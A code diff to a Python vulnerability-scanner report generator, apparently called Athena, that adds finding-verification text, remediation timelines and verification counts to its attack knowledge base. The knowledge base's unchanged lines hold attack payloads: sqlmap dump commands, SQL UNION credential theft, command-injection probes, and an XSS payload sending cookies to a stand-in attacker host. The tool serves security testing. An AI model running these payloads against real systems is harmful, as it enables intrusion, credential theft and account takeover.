@@ -12,7 +12,9 @@ import logging
 # attacker uses to compromise the target, what they gain, and the tools to do it.
 ATTACK_KB: Dict[str, Dict[str, Any]] = {
     'SQL Injection': {
-        'description': 'An attacker injects crafted SQL into unsanitized inputs to manipulate the database queries the application runs.',
+        'description': ('An attacker injects crafted SQL into unsanitized inputs to manipulate the database queries the application runs. '
+            'Error/time/boolean differentials prove the backend concatenates user input into SQL. '
+            'Business impact is total data compromise: authentication bypass, theft of all rows (credentials, PII, payments), and often remote code execution via DB functions (xp_cmdshell, INTO OUTFILE) or stacked queries.'),
         'attack_techniques': [
             'Automate detection/extraction with `sqlmap -u "https://target/page?id=1" --batch --dbs --dump` to enumerate databases and dump tables.',
             'Manual UNION extraction: `\' UNION SELECT 1,2,3-- -` to map columns, then `\' UNION SELECT username,password FROM users-- -` to steal credentials.',
@@ -23,7 +25,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['sqlmap', 'Burp Suite', 'SQLNinja', 'hashcat (crack dumped hashes)'],
     },
     'Command Injection': {
-        'description': 'An attacker injects operating-system commands through unsanitized inputs that the server passes to a shell.',
+        'description': ('An attacker injects operating-system commands through unsanitized inputs that the server passes to a shell. '
+            'Strict output patterns (uid=/gid=, root:x:0:0:, uname) or scaling time delays prove execution — a single slow response is never enough. '
+            'Business impact is immediate remote code execution as the web-server user, leading to full host takeover, persistence, credential harvesting and lateral movement.'),
         'attack_techniques': [
             'Blind confirmation with timing: `?file=x; sleep 5` or `?file=x|sleep 5` and compare response times.',
             'Output-based extraction: `?ip=127.0.0.1; id` or `; whoami` to read command output directly in the response.',
@@ -34,7 +38,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['Burp Suite', 'commix', 'netcat', 'pwncat-cs'],
     },
     'XSS': {
-        'description': 'An attacker injects script that executes in another user\'s browser, hijacking their session or actions.',
+        'description': ('An attacker injects script that executes in another user\'s browser, hijacking their session or actions. '
+            'Athena confirms this with a double-canary differential: two unique tokens must both reflect unencoded in an executable HTML context while absent from the benign baseline — encoded or static matches are dropped, never reported. '
+            'Business impact is session hijacking and account takeover for every victim who views the page, plus credential theft, defacement and malware delivery.'),
         'attack_techniques': [
             'Cookie theft: inject `<script>fetch("http://attacker/c?c="+document.cookie)</script>` and harvest session cookies from your listener.',
             'Session hijack end-to-end: replay the stolen cookie with `curl -H "Cookie: session=..." https://target/account` to take over the victim account.',
@@ -98,7 +104,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['crlfuzz', 'Burp Suite'],
     },
     'Host Header Injection': {
-        'description': 'An attacker supplies a forged Host header to influence how the application builds URLs and routes requests.',
+        'description': ('An attacker supplies a forged Host header to influence how the application builds URLs and routes requests. '
+            'Athena confirms this with a differential: a unique marker host must reflect with the forged Host but be absent with the legitimate Host — static pages containing "evil.com" are not findings. '
+            'Business impact is password-reset poisoning (reset links leak to the attacker → account takeover), web-cache poisoning, and routing to hidden internal vhosts.'),
         'attack_techniques': [
             'Password-reset poisoning: send `Host: attacker.com` on a reset request; the email contains a poisoned link that leaks the reset token to the attacker.',
             'Cache poisoning: poison a cached page with an attacker Host header so all visitors receive attacker-controlled content.',
@@ -108,7 +116,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['Burp Suite', 'Host Header Injection scanner', 'can-i-take-over-xyz'],
     },
     'Web Cache Poisoning': {
-        'description': 'An attacker manipulates unkeyed inputs (headers, cookies, query params) so the cache stores attacker-controlled content served to everyone.',
+        'description': ('An attacker manipulates unkeyed inputs (headers, cookies, query params) so the cache stores attacker-controlled content served to everyone. '
+            'Athena confirms this with a unique per-probe marker (athena-<rand>.evil-test.com) that must reflect with the poison header but be absent without it — generic "evil.com" matches are discarded as footer noise. '
+            'Business impact is stored mass compromise: every visitor of the poisoned URL receives attacker script (mass session theft, malware, account takeover).'),
         'attack_techniques': [
             'Discover unkeyed inputs with Burp Param Miner: audit for headers/params that change the response but are not part of the cache key.',
             'Poison via unkeyed header: send `X-Forwarded-Host: evil.com` and a cache-buster param so the CDN caches a page with attacker-controlled script URLs.',
@@ -210,7 +220,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['curl', 'feroxbuster', 'nuclei', 'gitleaks'],
     },
     'Sensitive Information Disclosure': {
-        'description': 'The application leaks internal details (versions, stack traces, source comments, phpinfo) useful for attack targeting.',
+        'description': ('The application leaks internal details (versions, stack traces, source comments, phpinfo) useful for attack targeting. '
+            'A phpinfo() page (e.g. PHP 8.1.34) discloses the exact interpreter, extensions, environment variables, paths and server config — a blueprint for version-specific exploits. '
+            'Business impact is precision targeting: the attacker skips guessing and goes straight to working CVEs, credential paths and config locations.'),
         'attack_techniques': [
             'Mine responses: grep HTML/comments/JS for internal paths, emails, tokens, and stack traces.',
             'Version-based targeting: fingerprint exposed versions (`Server`, `phpinfo()`) and match against public CVEs.',
@@ -220,7 +232,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['Burp Suite', 'grep', 'nuclei', 'whatweb'],
     },
     'Directory Listing': {
-        'description': 'The server lists directory contents, exposing files that should be hidden.',
+        'description': ('The server lists directory contents, exposing files that should be hidden. '
+            'Athena only reports this when a strict "Index of /" marker plus 2+ listing indicators are present on a directory-like URL — generic pages are never flagged. '
+            'Business impact is direct file disclosure: backups (.sql/.zip), configs, uploads and source that shortcut to credential theft and RCE.'),
         'attack_techniques': [
             'Browse the listing with `curl https://target/uploads/` to find user-uploaded files, backups, and source.',
             'Look for backup archives (`db.sql`, `backup.zip`, `site.tar.gz`) that contain databases or configs.',
@@ -230,7 +244,9 @@ ATTACK_KB: Dict[str, Dict[str, Any]] = {
         'tools': ['curl', 'dirsearch', 'gobuster'],
     },
     'Security Headers': {
-        'description': 'Missing or weak security headers remove browser-enforced protections against common client-side attacks.',
+        'description': ('Missing or weak security headers remove browser-enforced protections against common client-side attacks. '
+            'Absent X-Frame-Options/CSP/HSTS/X-Content-Type-Options leaves clickjacking, MIME-sniffing, TLS-downgrade and XSS amplification open on every page that lacks them. '
+            'Business impact is client-side compromise at scale: session theft, credential capture and weakened transport for all users.'),
         'attack_techniques': [
             'Clickjacking: if `X-Frame-Options`/`frame-ancestors` is absent, iframe the sensitive page and trick the victim into clicking invisible buttons.',
             'MIME sniffing: absent `X-Content-Type-Options` lets you upload HTML/JS disguised as images and run script in the victim\'s origin.',
@@ -505,6 +521,7 @@ class ReportGenerator:
                     'subdomains': discovery.get('subdomains', []),
                     'admin_panels': discovery.get('admin_panels', []),
                     'login_forms': discovery.get('login_forms', []),
+                    'waf': discovery.get('waf', {}),
                 },
                 'no_vulnerabilities_found': no_findings,
                 'tech_stack_hardening': self.generate_tech_suggestions(discovery.get('technologies', []), discovery.get('technologies_with_confidence', [])),
@@ -537,6 +554,7 @@ class ReportGenerator:
                          if getattr(c, 'success', False)
                          or (isinstance(c, dict) and c.get('success'))]
         admin_panels = bruteforce.get('admin_panels') or []
+        anon = bruteforce.get('anonymous_findings') or []
         return {
             'successful_web_logins': [
                 {
@@ -567,6 +585,16 @@ class ReportGenerator:
                  'panel_type': p.get('panel_type', 'UNKNOWN'),
                  'status': p.get('status', '')}
                 for p in admin_panels if isinstance(p, dict)
+            ],
+            'anonymous_access': [
+                {'service': a.get('service', ''), 'host': a.get('host', ''),
+                 'port': a.get('port', ''), 'detail': a.get('detail', '')}
+                for a in anon if isinstance(a, dict)
+            ],
+            'spray_lockouts': [
+                {'url': l.get('url', ''), 'detail': l.get('detail', '')}
+                for l in (bruteforce.get('spray_lockouts') or [])
+                if isinstance(l, dict)
             ],
             'web_logins_found': len(web_logins),
         }
@@ -1240,28 +1268,43 @@ class ReportGenerator:
                     return ATTACK_KB[canonical]
             return generic
 
+        # Remediation lookup so every type carries its fix + timeline
+        _recs = {r.get('issue', ''): r for r in self.generate_recommendations(vulnerabilities)}
+        def _rec_for(vtype: str, sev: str):
+            for k, r in _recs.items():
+                if k and k in vtype:
+                    return r
+            _tl = {'CRITICAL': 'Immediate', 'HIGH': 'Urgent', 'MEDIUM': 'Scheduled',
+                   'LOW': 'Scheduled', 'INFO': 'Scheduled'}.get(sev.upper(), 'Scheduled')
+            return {'recommendation': ('Investigate against vendor guidance, apply the fix, '
+                                       'and re-test to confirm remediation.'),
+                    'timeline': _tl}
+
         for vuln in vulnerabilities:
             vtype = vuln.get('type', 'General Finding')
             confirmed_url = vuln.get('url', '')
             payload = vuln.get('payload', '')
-            
+            sev = str(vuln.get('severity', 'UNKNOWN'))
+
             if vtype not in details:
                 kb = _kb_for(vtype)
-                # Generate URL-specific attack techniques
                 url_specific_techniques = self._generate_url_specific_techniques(
                     kb['attack_techniques'], confirmed_url, payload, vtype,
                     verification=vuln.get('verification'),
                 )
+                rec = _rec_for(vtype, sev)
                 details[vtype] = {
                     'description': kb['description'],
                     'attack_techniques': url_specific_techniques,
                     'attacker_gains': kb['attacker_gains'],
                     'tools': kb['tools'],
                     'assets_affected': [],
-                    'severity': vuln.get('severity', 'UNKNOWN'),
-                    # Per-URL scanner rows.  Despite the historical key name,
-                    # these are observations until verification says otherwise.
-                    'confirmed_findings': []
+                    'severity': sev,
+                    'remediation': rec.get('recommendation', ''),
+                    'timeline': rec.get('timeline', 'Scheduled'),
+                    'confirmed_findings': [],
+                    'verified_count': 0,
+                    'unverified_count': 0,
                 }
 
             if confirmed_url and confirmed_url not in details[vtype]['assets_affected']:
@@ -1272,11 +1315,34 @@ class ReportGenerator:
                        if isinstance(verification, dict) else '')
             verified = bool(vuln.get('verified')) or vstatus.lower() in (
                 'confirmed', 'success')
+            vstat = str(vuln.get('verification_status') or '')
+            if not vstat:
+                vstat = 'confirmed' if verified else 'unverified'
+            # Exploitation-runner inconclusive stays inconclusive — never
+            # presented as a full finding; the HTML groups it separately.
+            if vstatus.lower() == 'inconclusive' or vstat.lower() == 'inconclusive':
+                vstat = 'inconclusive'
+                verified = False
+            if verified:
+                details[vtype]['verified_count'] += 1
+            else:
+                details[vtype]['unverified_count'] += 1
+            ev = vuln.get('evidence')
+            try:
+                ev_str = (', '.join(f'{k}={v}' for k, v in list(ev.items())[:4])
+                          if isinstance(ev, dict) and ev else '')
+            except Exception:
+                ev_str = ''
             details[vtype]['confirmed_findings'].append({
                 'url': confirmed_url,
                 'payload': payload,
                 'description': vuln.get('description', ''),
                 'verified': verified,
+                'verification_status': vstat,
+                'confidence': str(vuln.get('confidence', 'medium' if verified else 'low')),
+                'evidence': ev_str,
+                'verification_detail': (verification.get('evidence', {}).get('description', '')
+                                        if isinstance(verification, dict) else ''),
             })
 
         return details
